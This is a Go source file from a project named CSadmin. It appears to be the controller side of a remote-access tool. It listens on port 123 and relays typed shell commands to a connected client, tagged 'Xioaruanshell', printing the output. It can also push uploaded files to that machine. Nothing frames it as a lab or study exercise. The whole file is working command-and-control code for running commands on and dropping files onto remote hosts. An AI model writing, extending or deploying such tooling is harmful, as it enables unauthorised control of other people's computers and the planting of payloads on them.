package action

import (
	"CSadmin/function"
	"CSadmin/upload"
	"fmt"
	"net"
	"strings"
)

var port string
var ip string
var shell string
var ok string
var check string
var file string

func Conn_ip() {

	port := "123"
	conn := function.Lis_net(port)
connall:
	for {
		choose := SwitchChoose()
		// fmt.Print(choose)
		switch choose {
		case "1":
			code_check_shell := "Xioaruanshell"
			function.Write_conn(conn, code_check_shell)
			for {
				pwd := function.Read_conn(conn)
				pwd = strings.Replace(pwd, "\n", "", -1)
				fmt.Printf("%v >", pwd)
				function.Scanf(&shell)
				if shell == "exit()" {
					check = "no"
					function.Write_conn(conn, check)
					goto connall
				}
				chechkongeg(shell, conn, pwd)
				function.Write_conn(conn, shell)
				output := function.Read_conn(conn)
				fmt.Println(output)
				ok = "ok"
				function.Write_conn(conn, ok)
			}
		case "2":
			code_check_shell := "XioaruanUpload"
			function.Write_conn(conn, code_check_shell)
			for {
				files := "File"
				fmt.Printf("%v >", files)
				function.Scanf(&file)
				if file == "exit()" {
					check = "no"
					function.Write_conn(conn, check)
					goto connall
				}
				code := upload.CheckFile(file)
				if code == "no" {
					fmt.Println("文件不存在")
					continue
				}
				filebase := upload.CheckFileName(file)
				fmt.Println(filebase)
				function.Write_conn(conn, filebase)
				upload.Write_File_toconn(file, conn)
			}
		default:
			fmt.Println("还没有开发哦~")
			goto connall
		}
	}
	// defer conn.Close()

}

func chechkongeg(shell string, conn net.Conn, pwd string) {
	if shell == "" {
		fmt.Println("命令为空")
		fmt.Printf("%v >", pwd)
		function.Scanf(&shell)
		function.Write_conn(conn, shell)

		chechkongeg(shell, conn, pwd)
	}
}
